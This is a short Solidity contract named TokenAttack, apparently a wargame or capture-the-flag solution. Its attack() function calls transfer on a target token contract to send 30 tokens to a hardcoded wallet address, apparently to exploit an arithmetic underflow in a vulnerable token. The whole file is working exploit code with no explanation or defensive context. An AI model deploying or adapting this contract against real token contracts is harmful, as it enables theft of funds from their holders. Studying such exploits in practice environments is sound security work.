// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenAttack {
    IToken public target;
    address public MyAddress = 0x88Fd768BFDc265216CdD5F9d172d296B7114197A;

    constructor(address _target) {
        target = IToken(_target);
    }

    function attack() external {
        target.transfer(MyAddress, 30);
    }
}
